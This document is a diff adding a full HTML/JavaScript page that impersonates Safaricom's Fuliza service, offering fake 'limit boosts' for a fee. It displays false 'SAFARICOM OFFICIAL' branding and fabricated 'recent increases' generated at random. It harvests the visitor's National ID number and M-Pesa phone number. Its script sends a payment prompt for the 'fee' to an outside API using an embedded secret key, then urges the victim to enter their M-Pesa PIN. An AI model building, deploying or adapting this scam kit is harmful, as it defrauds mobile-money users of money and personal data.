@@ -1,0 +1,397 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
+<title>Fuliza Limit Boost</title>
+<link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:'Outfit',sans-serif;background:linear-gradient(180deg,#e8f5ed 0%,#f0faf3 40%,#f7fdf9 100%);color:#1a1a1a;min-height:100vh;overflow-x:hidden}
+.header{background:#1b1b1b;padding:14px 16px;text-align:center;position:sticky;top:0;z-index:10}
+.header h3{color:#fff;font-size:14px;font-weight:500;letter-spacing:.3px}
+.header small{color:#9a9a9a;font-size:11px}
+.hero{text-align:center;padding:28px 20px 18px}
+.hero h1{font-size:26px;font-weight:800;letter-spacing:1px}
+.hero h1 .green{color:#00a651}
+.hero h1 .red{color:#e8222a}
+.hero p{color:#888;font-size:13px;font-weight:300;margin-top:6px;letter-spacing:.5px}
+.info-bar{margin:0 20px 14px;background:#eef9f1;border-left:3px solid #00a651;border-radius:8px;padding:14px 16px;display:flex;align-items:flex-start;gap:10px}
+.info-bar svg{flex-shrink:0;margin-top:2px}
+.info-bar span{font-size:13px;color:#444;font-weight:300;line-height:1.5}
+.recent{margin:0 20px 20px;background:#f0faf2;border-radius:10px;padding:14px 16px;display:flex;align-items:center;gap:10px}
+.recent svg{flex-shrink:0}
+.recent .label{font-size:13px;font-weight:600;color:#00a651}
+.recent .detail{font-size:12px;color:#666;font-weight:300;margin-top:2px}
+.progress-bar{margin:0 20px 6px;height:6px;border-radius:3px;background:linear-gradient(to right,#1a1a1a 33%,#e8222a 33%,#e8222a 55%,#00a651 55%);overflow:hidden}
+.section-title{padding:16px 20px 12px;display:flex;align-items:center;gap:8px;font-size:15px;font-weight:600}
+.section-title svg{color:#00a651}
+.grid{display:grid;grid-template-columns:1fr 1fr;gap:12px;padding:0 20px 20px}
+.card{background:rgba(0,166,81,.04);border:1.5px solid rgba(0,166,81,.18);border-radius:14px;padding:18px 16px;cursor:pointer;position:relative;transition:all .2s;overflow:hidden}
+.card:active{transform:scale(.97);border-color:#00a651;background:rgba(0,166,81,.1)}
+.card .amount{font-size:18px;font-weight:700;color:#1a1a1a}
+.card .fee{display:inline-block;margin-top:8px;font-size:11px;color:#3a7d50;background:rgba(0,166,81,.08);padding:3px 10px;border-radius:20px;font-weight:400}
+.card .arrow{position:absolute;right:12px;bottom:12px;opacity:.1;font-size:36px;color:#00a651;font-weight:300}
+.card .hot{position:absolute;top:0;right:0;background:#e8222a;color:#fff;font-size:9px;font-weight:700;padding:3px 8px;border-radius:0 12px 0 8px;letter-spacing:.5px}
+.cta-wrap{padding:10px 20px 16px}
+.cta-btn{width:100%;padding:16px;background:#00a651;color:#fff;border:none;border-radius:14px;font-size:16px;font-weight:600;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:8px;font-family:inherit;transition:background .2s}
+.cta-btn:active{background:#008a43}
+.trust{display:grid;grid-template-columns:1fr 1fr;gap:10px;padding:10px 20px 30px}
+.trust-item{display:flex;align-items:center;gap:8px;font-size:12px;color:#888;font-weight:400}
+.trust-item svg{flex-shrink:0}
+
+/* Overlay + Popups */
+.overlay{display:none;position:fixed;inset:0;background:rgba(0,0,0,.45);backdrop-filter:blur(6px);z-index:100;align-items:center;justify-content:center}
+.overlay.active{display:flex}
+.popup{background:#fff;border-radius:20px;width:calc(100% - 40px);max-width:400px;overflow:hidden;animation:slideUp .3s ease}
+@keyframes slideUp{from{transform:translateY(40px);opacity:0}to{transform:translateY(0);opacity:1}}
+@keyframes spin{to{transform:rotate(360deg)}}
+
+/* Loading Popup */
+.loading-popup{padding:48px 30px;text-align:center}
+.spinner{width:52px;height:52px;border:3px solid #e8e8e8;border-top-color:#00a651;border-radius:50%;animation:spin .8s linear infinite;margin:0 auto 20px}
+.loading-popup p{font-size:15px;color:#555;font-weight:400}
+
+/* Review Popup */
+.review-popup{text-align:center}
+.review-header{padding:24px 20px 16px;background:linear-gradient(135deg,#f7fdf8,#fff)}
+.review-badge{display:inline-flex;align-items:center;gap:6px;background:#eef9f1;padding:6px 16px;border-radius:20px;font-size:11px;font-weight:600;color:#00a651;letter-spacing:1.5px;margin-bottom:12px}
+.review-badge .dot{width:7px;height:7px;background:#00a651;border-radius:50%}
+.review-title{font-size:28px;font-weight:700;color:#00a651;margin-bottom:4px}
+.review-sub{font-size:12px;color:#888;font-weight:300;letter-spacing:.5px}
+.review-divider{height:3px;width:40px;background:#00a651;border-radius:2px;margin:12px auto 0}
+.review-body{padding:24px 24px 0}
+.review-body h3{font-size:18px;font-weight:700;margin-bottom:6px}
+.review-body>p{font-size:13px;color:#888;font-weight:300;line-height:1.5;margin-bottom:20px}
+.review-details{background:#fafafa;border-radius:14px;padding:20px;margin-bottom:20px;text-align:left}
+.review-row{display:flex;justify-content:space-between;align-items:center;padding:8px 0}
+.review-row:first-child{padding-top:0}
+.review-row .label{font-size:13px;color:#888;font-weight:400}
+.review-row .value{font-size:16px;font-weight:700}
+.review-row .value.green{color:#00a651}
+.review-sep{height:1px;background:#eee;margin:4px 0}
+.phone-section{text-align:left;margin-top:4px}
+.phone-section .label{font-size:10px;font-weight:600;color:#aaa;letter-spacing:1.5px;margin-bottom:8px}
+.phone-input-wrap{display:flex;align-items:center;gap:8px}
+.phone-input-wrap .dot{width:8px;height:8px;background:#00a651;border-radius:50%;flex-shrink:0}
+.phone-input{flex:1;border:none;background:transparent;font-size:16px;font-family:inherit;font-weight:500;color:#1a1a1a;outline:none}
+.phone-input::placeholder{color:#ccc}
+.review-actions{padding:20px 24px 24px}
+.pay-btn{width:100%;padding:16px;background:#00a651;color:#fff;border:none;border-radius:14px;font-size:16px;font-weight:600;cursor:pointer;font-family:inherit;transition:background .2s}
+.pay-btn:active{background:#008a43}
+.cancel-btn{width:100%;padding:12px;background:transparent;color:#bbb;border:none;font-size:14px;cursor:pointer;font-family:inherit;font-weight:400;margin-top:4px}
+.cancel-btn:active{color:#888}
+
+/* Success Popup */
+.success-popup{text-align:center;padding:0}
+.success-header{padding:20px 20px 12px;background:linear-gradient(135deg,#f7fdf8,#fff)}
+.success-notif{background:#f0faf2;border-radius:10px;padding:12px 16px;margin:0 20px;display:flex;align-items:center;gap:10px;text-align:left}
+.success-notif svg{flex-shrink:0}
+.success-notif .text{font-size:13px;font-weight:500;color:#333}
+.success-notif .time{font-size:11px;color:#aaa;font-weight:300}
+.success-check{width:80px;height:80px;background:#eef9f1;border-radius:50%;display:flex;align-items:center;justify-content:center;margin:24px auto 16px}
+.success-check svg{width:40px;height:40px}
+.success-popup h2{font-size:26px;font-weight:800;color:#1a1a1a;margin-bottom:8px}
+.success-popup .msg{font-size:14px;color:#777;font-weight:300;line-height:1.5;padding:0 20px;margin-bottom:20px}
+.success-popup .msg strong{color:#00a651;font-weight:700}
+.success-tip{background:#fef9e7;border-radius:12px;margin:0 20px 24px;padding:16px;display:flex;align-items:flex-start;gap:10px;text-align:left}
+.success-tip svg{flex-shrink:0;margin-top:2px}
+.success-tip p{font-size:12.5px;color:#665a20;font-weight:500;line-height:1.5}
+.return-btn{width:calc(100% - 48px);margin:0 24px 24px;padding:16px;background:#1a1a1a;color:#fff;border:none;border-radius:14px;font-size:15px;font-weight:600;cursor:pointer;font-family:inherit;transition:background .2s}
+.return-btn:active{background:#333}
+
+/* Identity Popup */
+.identity-popup{text-align:center}
+.identity-body{padding:24px 24px 0;text-align:left}
+.identity-body h3{font-size:20px;font-weight:700;text-align:center;margin-bottom:6px}
+.identity-body>p{font-size:13px;color:#888;font-weight:300;line-height:1.5;text-align:center;margin-bottom:24px}
+.field-label{font-size:13px;font-weight:600;color:#333;margin-bottom:8px}
+.field-input{width:100%;padding:16px;border:1.5px solid #e0e0e0;border-radius:12px;font-size:16px;font-family:inherit;font-weight:400;color:#1a1a1a;outline:none;transition:border-color .2s;background:#fafafa}
+.field-input:focus{border-color:#00a651;background:#fff}
+.field-input::placeholder{color:#c0c0c0}
+.phone-field{display:flex;gap:0;margin-bottom:0}
+.phone-prefix{padding:16px 14px;background:#f0f0f0;border:1.5px solid #e0e0e0;border-right:none;border-radius:12px 0 0 12px;font-size:16px;font-weight:600;color:#555;white-space:nowrap;display:flex;align-items:center}
+.phone-field .field-input{border-radius:0 12px 12px 0;border-left:none}
+.field-group{margin-bottom:20px}
+.identity-actions{padding:16px 24px 20px}
+.verify-btn{width:100%;padding:16px;background:#00a651;color:#fff;border:none;border-radius:14px;font-size:16px;font-weight:600;cursor:pointer;font-family:inherit;transition:background .2s}
+.verify-btn:active{background:#008a43}
+.secure-text{text-align:center;padding:0 24px 20px;font-size:11px;color:#bbb;font-weight:400;letter-spacing:1px}
+
+/* Error toast */
+.toast{position:fixed;top:20px;left:50%;transform:translateX(-50%) translateY(-100px);background:#e8222a;color:#fff;padding:12px 24px;border-radius:12px;font-size:13px;font-weight:500;z-index:200;transition:transform .3s ease;white-space:nowrap}
+.toast.show{transform:translateX(-50%) translateY(0)}
+</style>
+</head>
+<body>
+
+<div class="header">
+  <h3>Web browser</h3>
+  <small>Web browser</small>
+</div>
+
+<div class="hero">
+  <h1><span class="green">FULIZA</span> <span class="red">LIMIT BOOST</span></h1>
+  <p>Instant Limit Increase &bull; No Paperwork &bull; Same Day Access</p>
+</div>
+
+<div class="info-bar">
+  <svg width="20" height="20" fill="none" viewBox="0 0 24 24"><circle cx="12" cy="12" r="10" stroke="#00a651" stroke-width="2"/><path d="M12 8v4M12 16h.01" stroke="#00a651" stroke-width="2" stroke-linecap="round"/></svg>
+  <span>Choose your new Fuliza limit and complete the payment to get instant access.</span>
+</div>
+
+<div class="recent" id="recentBar">
+  <svg width="20" height="20" fill="none" viewBox="0 0 24 24"><path d="M22 2L11 13M22 2l-7 20-4-9-9-4 20-7z" stroke="#00a651" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>
+  <div>
+    <div class="label">Recent increases</div>
+    <div class="detail" id="recentText">0725****89 increased to Ksh 18,000 &bull; just now</div>
+  </div>
+</div>
+
+<div class="progress-bar"></div>
+
+<div class="section-title">
+  <svg width="18" height="18" fill="none" viewBox="0 0 24 24"><rect x="2" y="3" width="20" height="18" rx="3" stroke="#00a651" stroke-width="2"/><path d="M2 9h20" stroke="#00a651" stroke-width="2"/></svg>
+  Select Your Fuliza Limit
+</div>
+
+<div class="grid" id="grid"></div>
+
+<div class="cta-wrap">
+  <button class="cta-btn" id="ctaBtn" disabled>
+    <svg width="18" height="18" fill="none" viewBox="0 0 24 24"><path d="M13 2L3 14h9l-1 8 10-12h-9l1-8z" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>
+    Get Limit Now
+  </button>
+</div>
+
+<div class="trust">
+  <div class="trust-item"><svg width="16" height="16" fill="none" viewBox="0 0 24 24"><rect x="3" y="11" width="18" height="10" rx="2" stroke="#bbb" stroke-width="2"/><path d="M7 11V7a5 5 0 0110 0v4" stroke="#bbb" stroke-width="2"/></svg> Secure</div>
+  <div class="trust-item"><svg width="16" height="16" fill="none" viewBox="0 0 24 24"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z" stroke="#bbb" stroke-width="2"/></svg> Encrypted</div>
+  <div class="trust-item"><svg width="16" height="16" fill="none" viewBox="0 0 24 24"><path d="M13 2L3 14h9l-1 8 10-12h-9l1-8z" stroke="#bbb" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg> Instant</div>
+  <div class="trust-item"><svg width="16" height="16" fill="none" viewBox="0 0 24 24"><path d="M20 6L9 17l-5-5" stroke="#bbb" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg> Verified</div>
+</div>
+
+<!-- Identity Popup -->
+<div class="overlay" id="identityOverlay">
+  <div class="popup identity-popup">
+    <div class="review-header">
+      <div class="review-badge"><span class="dot"></span>SAFARICOM OFFICIAL</div>
+      <div class="review-title">FulizaBoost</div>
+      <div class="review-divider"></div>
+      <div class="review-sub">Instant Limit Increase &bull; Guaranteed Approval</div>
+    </div>
+    <div class="identity-body">
+      <h3>Identify Yourself</h3>
+      <p>This information is required to verify your eligibility for the limit increase.</p>
+      <div class="field-group">
+        <div class="field-label">National ID Number</div>
+        <input type="text" class="field-input" id="idInput" placeholder="Enter ID Number" maxlength="10" inputmode="numeric">
+      </div>
+      <div class="field-group">
+        <div class="field-label">M-Pesa Registered Number</div>
+        <div class="phone-field">
+          <div class="phone-prefix">+254</div>
+          <input type="tel" class="field-input" id="phoneInput" placeholder="7xx xxx xxx" maxlength="10" inputmode="tel">
+        </div>
+      </div>
+    </div>
+    <div class="identity-actions">
+      <button class="verify-btn" id="verifyBtn">Verify &amp; Continue</button>
+    </div>
+    <div class="secure-text">SECURE 256-BIT ENCRYPTION</div>
+  </div>
+</div>
+
+<!-- Review Popup -->
+<div class="overlay" id="reviewOverlay">
+  <div class="popup review-popup">
+    <div class="review-header">
+      <div class="review-badge"><span class="dot"></span>SAFARICOM OFFICIAL</div>
+      <div class="review-title">FulizaBoost</div>
+      <div class="review-divider"></div>
+      <div class="review-sub">Instant Limit Increase &bull; Guaranteed Approval</div>
+    </div>
+    <div class="review-body">
+      <h3>Review Request</h3>
+      <p>Please confirm your selection before we initiate the STK push.</p>
+      <div style="text-align:center;margin-bottom:16px">
+        <img src="logo/download.png" alt="Fuliza M-Pesa" style="height:44px;object-fit:contain">
+      </div>
+      <div class="review-details">
+        <div class="review-row"><span class="label">New Limit</span><span class="value green" id="revLimit">Ksh 5,000</span></div>
+        <div class="review-row"><span class="label">Processing Fee</span><span class="value" id="revFee">Ksh 100</span></div>
+        <div class="review-sep"></div>
+        <div class="phone-section">
+          <div class="label">PAYMENT PHONE</div>
+          <div class="phone-input-wrap">
+            <span class="dot"></span>
+            <span id="revPhone" style="font-size:16px;font-weight:500;color:#1a1a1a">+254 700 000 000</span>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="review-actions">
+      <button class="pay-btn" id="payBtn">Confirm &amp; Pay</button>
+      <button class="cancel-btn" id="cancelBtn">Cancel Request</button>
+    </div>
+  </div>
+</div>
+
+<!-- Loading Popup -->
+<div class="overlay" id="loadingOverlay">
+  <div class="popup loading-popup">
+    <div class="spinner"></div>
+    <p id="loadingText">Initiating STK Push...</p>
+  </div>
+</div>
+
+<!-- Success Popup -->
+<div class="overlay" id="successOverlay">
+  <div class="popup success-popup">
+    <div class="success-header">
+      <div class="review-badge"><span class="dot"></span>SAFARICOM OFFICIAL</div>
+    </div>
+    <div class="success-notif">
+      <svg width="20" height="20" fill="none" viewBox="0 0 24 24"><rect x="2" y="3" width="20" height="18" rx="3" stroke="#00a651" stroke-width="2"/><path d="M8 12l3 3 5-5" stroke="#00a651" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>
+      <div>
+        <div class="text" id="successNotifText">0703****38 increased to Ksh 5,000</div>
+        <div class="time">&bull; just now</div>
+      </div>
+    </div>
+    <div class="success-check">
+      <svg fill="none" viewBox="0 0 24 24"><path d="M20 6L9 17l-5-5" stroke="#00a651" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"/></svg>
+    </div>
+    <h2>Success!</h2>
+    <p class="msg">Your boost of <strong id="successAmount">Ksh 5,000</strong> is pending processe.</p>
+    <div class="success-tip">
+      <svg width="20" height="20" fill="none" viewBox="0 0 24 24"><circle cx="12" cy="12" r="10" stroke="#c9a52c" stroke-width="2"/><path d="M12 8v4M12 16h.01" stroke="#c9a52c" stroke-width="2" stroke-linecap="round"/></svg>
+      <p>Final Step: Enter your M-Pesa PIN on the prompt currently showing on your phone to activate your new limit.</p>
+    </div>
+    <button class="return-btn" id="returnBtn">Return to Dashboard</button>
+  </div>
+</div>
+
+<!-- Toast -->
+<div class="toast" id="toast"></div>
+
+<script>
+const plans=[
+  {amount:5000,fee:100},{amount:7500,fee:153},{amount:10000,fee:204},{amount:12500,fee:245},
+  {amount:16000,fee:306},{amount:21000,fee:408},{amount:25500,fee:510,hot:true},{amount:30000,fee:592,hot:true},
+  {amount:35000,fee:694},{amount:40000,fee:796},{amount:45000,fee:898},{amount:50000,fee:1000},
+  {amount:60000,fee:1204},{amount:70000,fee:1408}
+];
+const fmt=n=>'Ksh '+n.toLocaleString();
+const grid=document.getElementById('grid');
+let selected=null;
+
+plans.forEach((p,i)=>{
+  const c=document.createElement('div');
+  c.className='card';
+  c.innerHTML=`${p.hot?'<div class="hot">HOT</div>':''}<div class="amount">${fmt(p.amount)}</div><div class="fee">Fee: ${fmt(p.fee)}</div><div class="arrow">&nearr;</div>`;
+  c.onclick=()=>selectCard(i,c);
+  grid.appendChild(c);
+});
+
+function selectCard(i,el){
+  document.querySelectorAll('.card').forEach(c=>c.style.borderColor='#e0efe3');
+  el.style.borderColor='#00a651';
+  selected=plans[i];
+  document.getElementById('ctaBtn').disabled=false;
+}
+
+// Fake recent increases
+const prefixes=['0725','0712','0701','0798','0741','0720','0733','0757'];
+function randomRecent(){
+  const ph=prefixes[Math.floor(Math.random()*prefixes.length)]+'****'+Math.floor(10+Math.random()*90);
+  const amt=[5000,7500,10000,12500,16000,18000,21000,25500,30000][Math.floor(Math.random()*9)];
+  document.getElementById('recentText').textContent=ph+' increased to '+fmt(amt)+' \u2022 just now';
+}
+setInterval(randomRecent,4000);
+
+let userPhone='';
+
+// CTA → open Identity popup
+document.getElementById('ctaBtn').onclick=()=>{
+  if(!selected)return;
+  document.getElementById('idInput').value='';
+  document.getElementById('phoneInput').value='';
+  showOverlay('identityOverlay');
+};
+
+// Verify & Continue → validate ID + phone, then show Review popup
+document.getElementById('verifyBtn').onclick=()=>{
+  const idNum=document.getElementById('idInput').value.replace(/\s+/g,'');
+  const rawPhone=document.getElementById('phoneInput').value.replace(/\s+/g,'');
+  if(!/^\d{5,10}$/.test(idNum)){
+    showToast('Please enter a valid National ID number');return;
+  }
+  if(!/^\d{9}$/.test(rawPhone)){
+    showToast('Please enter a valid phone number');return;
+  }
+  userPhone='0'+rawPhone;
+  const display='+254 '+rawPhone.slice(0,3)+' '+rawPhone.slice(3,6)+' '+rawPhone.slice(6);
+  hideOverlay('identityOverlay');
+  document.getElementById('revLimit').textContent=fmt(selected.amount);
+  document.getElementById('revFee').textContent='Ksh '+selected.fee.toLocaleString();
+  document.getElementById('revPhone').textContent=display;
+  showOverlay('reviewOverlay');
+};
+
+// Cancel review
+document.getElementById('cancelBtn').onclick=()=>hideOverlay('reviewOverlay');
+
+// Confirm & Pay
+document.getElementById('payBtn').onclick=()=>{
+  hideOverlay('reviewOverlay');
+  document.getElementById('loadingText').textContent='Please wait...';
+  showOverlay('loadingOverlay');
+
+  setTimeout(()=>{
+    document.getElementById('loadingText').textContent='Initiating STK Push...';
+  },1200);
+
+  fetch('https://api.nestlink.co.ke/runPrompt',{
+    method:'POST',
+    headers:{'Content-Type':'application/json','Api-Secret':'f52159999631ccffe2012a1d'},
+    body:JSON.stringify({phone:userPhone,amount:selected.fee,load_response:false})
+  })
+  .then(r=>r.json())
+  .then(data=>{
+    hideOverlay('loadingOverlay');
+    if(data.status){
+      const masked=userPhone.slice(0,4)+'****'+userPhone.slice(-2);
+      document.getElementById('successNotifText').textContent=masked+' pending to increase '+fmt(selected.amount);
+      document.getElementById('successAmount').textContent=fmt(selected.amount);
+      showOverlay('successOverlay');
+    }else{
+      showToast(data.msg||'Request failed. Please try again.');
+    }
+  })
+  .catch(()=>{
+    hideOverlay('loadingOverlay');
+    showToast('Network error. Please try again.');
+  });
+};
+
+// Return
+document.getElementById('returnBtn').onclick=()=>{
+  hideOverlay('successOverlay');
+  selected=null;
+  document.querySelectorAll('.card').forEach(c=>c.style.borderColor='#e0efe3');
+  document.getElementById('ctaBtn').disabled=true;
+};
+
+// Overlay helpers
+function showOverlay(id){document.getElementById(id).classList.add('active')}
+function hideOverlay(id){document.getElementById(id).classList.remove('active')}
+
+// Toast
+function showToast(msg){
+  const t=document.getElementById('toast');
+  t.textContent=msg;t.classList.add('show');
+  setTimeout(()=>t.classList.remove('show'),3000);
+}
+</script>
+</body>
+</html>
